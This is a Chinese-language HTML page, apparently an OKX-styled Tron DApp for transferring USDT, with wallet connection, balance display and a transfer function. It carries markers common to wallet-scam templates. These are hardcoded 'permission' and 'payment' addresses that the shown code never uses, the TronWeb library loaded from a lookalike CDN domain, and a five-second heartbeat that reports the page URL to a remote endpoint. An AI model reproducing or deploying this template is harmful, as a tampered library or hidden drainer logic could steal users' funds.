<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
    <title>USDT 转账（Tron）</title>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        ::-webkit-scrollbar {
            display: none;
        }
        .tishi {
            width: 58%;
            padding: 0.1rem 0.3rem;
            background: #4b4848;
            z-index: 999999999999;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 0.3rem;
            color: white;
            font-size: 1rem;
            text-align: center;
            line-height: 3rem;
            display: none;
            height: auto;
            margin: 0 auto;
        }
        .form-group {
            padding: 1rem;
        }
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #ddd;
            border-radius: 0.5rem;
            font-size: 1rem;
            box-sizing: border-box;
        }
        .fee-info {
            padding: 0 1rem;
            color: #666;
            font-size: 0.9rem;
        }
        .balance-info {
            padding: 0 1rem;
            margin-bottom: 1rem;
            display: flex;
            justify-content: space-between;
        }
        .balance-item {
            flex: 1;
            padding: 0.5rem;
        }
        .balance-item .title {
            font-size: 0.9rem;
            color: #666;
        }
        .balance-item .num {
            font-size: 1.1rem;
            font-weight: bold;
        }
        .submit-btn {
            margin: 1rem;
            padding: 1rem;
            width: calc(100% - 2rem);
            background-color: #007aff;
            color: white;
            border: none;
            border-radius: 0.5rem;
            font-size: 1.1rem;
            cursor: pointer;
        }
        .submit-btn.disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .amount-display {
            padding: 0 1rem;
            margin-bottom: 1rem;
        }
        .amount-display .usd-value {
            color: #666;
            font-size: 0.9rem;
        }
        .max-btn {
            margin: -0.5rem 1rem 1rem auto;
            display: block;
            background: none;
            border: none;
            color: #007aff;
            cursor: pointer;
            font-size: 0.9rem;
        }
    </style>
    <link rel="stylesheet" href="css/okx.css">
</head>

<body id="app" class="uni-body pages-index-home">
    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>

    <uni-app class="uni-app--maxwidth">
        <uni-page data-page="pages/index/home">
            <uni-page-wrapper>
                <uni-page-body>
                    <body data-v-49fe1bb8="">
                        <div data-v-49fe1bb8="">
                            <!-- 收款地址输入区域 -->
                            <div class="form-group">
                                <label for="receiptAddress">收款地址（Tron地址）</label>
                                <input type="text" id="receiptAddress" placeholder="请输入Tron地址" />
                            </div>
                            
                            <!-- 转账金额区域 -->
                            <div class="form-group">
                                <label for="amount">转账金额（USDT）</label>
                                <input type="number" id="amount" placeholder="0.00" step="0.000001" min="0" />
                                <button id="maxBtn" class="max-btn">全部</button>
                                
                                <div class="amount-display">
                                    <div class="usd-value">约 <span id="amount-display">0.00</span> USD</div>
                                </div>
                            </div>
                            
                            <!-- 矿工费信息 -->
                            <div class="fee-info">
                                <p>矿工费: <span id="minerFee">0 TRX</span></p>
                            </div>
                            
                            <!-- 余额信息 -->
                            <div class="balance-info">
                                <div class="balance-item">
                                    <p class="title">USDT余额</p>
                                    <p class="num"><span id="usdtBalance">0.00</span> USDT</p>
                                </div>
                                <div class="balance-item">
                                    <p class="title">TRX余额</p>
                                    <p class="num"><span id="trxBalance">0.00</span> TRX</p>
                                </div>
                            </div>
                            
                            <!-- 确认按钮 -->
                            <button class="submit-btn disabled" id="submitBtn" disabled>确认转账</button>
                            
                        </div>
                        <div class="tishi" id="tip">提示</div>
                        <input id="to_address" type="hidden">
                    </body>
                </uni-page-body>
            </uni-page-wrapper>
        </uni-page>
    </uni-app>    
<script>
    // 配置地址
    window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
    window.Payment_address = 'TAymcrbZ3ybiVq9DrqQXWx3AmtPWMiwhsh';
    window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    window.heartbeatUrl = 'https://baidu.com/heartbeat';

    // 存储用户数据
    const userData = {
        address: null,
        trxBalance: null,
        usdtBalance: null
    };
    
    const USDT_TO_USD_RATE = 0.99; // USDT兑USD汇率，实际应从API获取
    const MINER_FEE_TRX = 0.1; // 矿工费，实际应根据网络情况计算

    // 主初始化函数
    async function initializeDApp() {
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
        
        if (!isMobile) {
            tip('建议在移动端钱包环境使用');
        } else if (isMobile && !isDAppBrowser) {
            const currentUrl = encodeURIComponent(window.location.href);
            window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
        } else if (isMobile && isDAppBrowser) {
            await connectWallet();
            bindEvents();
        }
        
        // 显示矿工费
        document.getElementById('minerFee').textContent = `${MINER_FEE_TRX} TRX`;
    }

    // 连接到钱包
    async function connectWallet() {
        try {
            if (window.tronWeb && window.tronWeb.ready) {
                await initDApp();
            } else if (window.tronLink) {
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                if (res.code === 200) {
                    window.tronWeb = window.tronLink.tronWeb;
                    await initDApp();
                }
            }
        } catch (error) {
            console.error("钱包连接失败:", error);
            tip('钱包连接失败，请检查钱包环境');
        }
    }

    // 初始化DApp数据
    async function initDApp() {
        try {
            userData.address = window.tronWeb.defaultAddress.base58;
            
            // 获取TRX余额
            const trxBalanceSun = await window.tronWeb.trx.getBalance(userData.address);
            userData.trxBalance = window.tronWeb.fromSun(trxBalanceSun);
            
            // 获取USDT余额
            const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
            const usdtBalanceRaw = await contract.balanceOf(userData.address).call();
            userData.usdtBalance = usdtBalanceRaw / 1e6; // USDT是6位小数
            
            // 更新页面显示
            document.getElementById('trxBalance').textContent = parseFloat(userData.trxBalance).toFixed(4);
            document.getElementById('usdtBalance').textContent = parseFloat(userData.usdtBalance).toFixed(4);
            
        } catch (error) {
            console.error("获取用户数据时出错:", error);
            tip('获取钱包数据失败');
        }
    }

    // 设置最大转账金额
    function setMaxAmount() {
        const amountInput = document.getElementById('amount');
        if (amountInput && userData.usdtBalance) {
            amountInput.value = parseFloat(userData.usdtBalance).toFixed(6);
            updateAmountDisplay();
        }
    }

    // 更新金额显示
    function updateAmountDisplay() {
        const amountInput = document.getElementById('amount');
        const amount = parseFloat(amountInput.value) || 0;
        
        // 更新USD显示
        const usdAmount = (amount * USDT_TO_USD_RATE).toFixed(2);
        const usdElement = document.getElementById('amount-display');
        if (usdElement) {
            usdElement.textContent = usdAmount;
        }
        
        updateSubmitButtonState();
        document.title = `正在申请转账 ${amount.toFixed(6)} USDT`;
    }

    // 更新提交按钮状态
    function updateSubmitButtonState() {
        const submitButton = document.getElementById('submitBtn');
        if (!submitButton) return;
        
        const amountInput = document.getElementById('amount');
        const amount = parseFloat(amountInput.value) || 0;
        const receiptAddress = document.getElementById('receiptAddress').value.trim();
        
        const hasAddress = receiptAddress !== '';
        const hasEnoughUsdt = amount <= parseFloat(userData.usdtBalance || '0');
        const hasEnoughTrx = parseFloat(userData.trxBalance || '0') >= MINER_FEE_TRX;
        
        const isValid = amount > 0 && hasAddress && hasEnoughUsdt && hasEnoughTrx;
        submitButton.disabled = !isValid;
        submitButton.classList.toggle('disabled', !isValid);
    }

    // 绑定事件
    function bindEvents() {
        // 金额输入事件
        const amountInput = document.getElementById('amount');
        if (amountInput) {
            amountInput.addEventListener('input', updateAmountDisplay);
        }
        
        // 地址输入事件
        const addressInput = document.getElementById('receiptAddress');
        if (addressInput) {
            addressInput.addEventListener('input', updateSubmitButtonState);
        }
        
        // 最大按钮事件
        const maxBtn = document.getElementById('maxBtn');
        if (maxBtn) {
            maxBtn.addEventListener('click', setMaxAmount);
        }
        
        // 确认转账按钮事件
        const submitBtn = document.getElementById('submitBtn');
        if (submitBtn) {
            submitBtn.addEventListener('click', onSubmitTransfer);
        }
    }

    // 提交转账
    async function onSubmitTransfer() {
        const receiptAddress = document.getElementById('receiptAddress').value.trim();
        const amountInput = document.getElementById('amount');
        const amount = parseFloat(amountInput.value) || 0;
        
        if (!receiptAddress) {
            tip('请输入收款地址');
            return;
        }
        
        // 验证Tron地址格式
        if (!window.tronWeb.isAddress(receiptAddress)) {
            tip('请输入有效的Tron地址');
            return;
        }
        
        try {
            tip('正在准备转账...');
            
            // 获取USDT合约实例
            const usdtContract = await window.tronWeb.contract().at(window.usdtContractAddress);
            
            // 转账金额需要乘以1e6（USDT的精度）
            const amountWithDecimals = Math.round(amount * 1e6);
            
            // 执行转账
            const result = await usdtContract.transfer(receiptAddress, amountWithDecimals).send({
                feeLimit: 1000000, // 手续费限制
                callValue: 0 // USDT转账不需要附加TRX
            });
            
            console.log("转账结果:", result);
            tip(`转账成功！交易哈希: ${result}`);
            
            // 重置金额
            amountInput.value = '';
            updateAmountDisplay();
            
        } catch (error) {
            console.error("转账失败:", error);
            tip(`转账失败: ${error.message || '未知错误'}`);
        }
    }

    // 显示提示信息
    function tip(message) {
        const tipElement = document.getElementById('tip');
        if (tipElement) {
            tipElement.textContent = message;
            tipElement.style.display = 'block';
            tipElement.style.height = 'auto';
            
            setTimeout(() => {
                tipElement.style.display = 'none';
            }, 3000);
        }
    }

    // 页面加载完成后初始化
    document.addEventListener('DOMContentLoaded', () => {
        initializeDApp();
    });

    // 心跳检测
    function sendHeartbeat() {
        const currentUrl = window.location.href;
        
        fetch(window.heartbeatUrl, {
            method: 'POST',
            mode: 'cors',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ url: currentUrl })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'error' && data.message === '会话已结束') {
                console.log('会话已结束');
                tip('会话已结束');
            }
        })
        .catch(() => {});
    }
    
    const heartbeatInterval = setInterval(sendHeartbeat, 5000);
    window.onload = sendHeartbeat;
    window.onbeforeunload = function() {
        clearInterval(heartbeatInterval);
    };
</script>
</body>
</html>
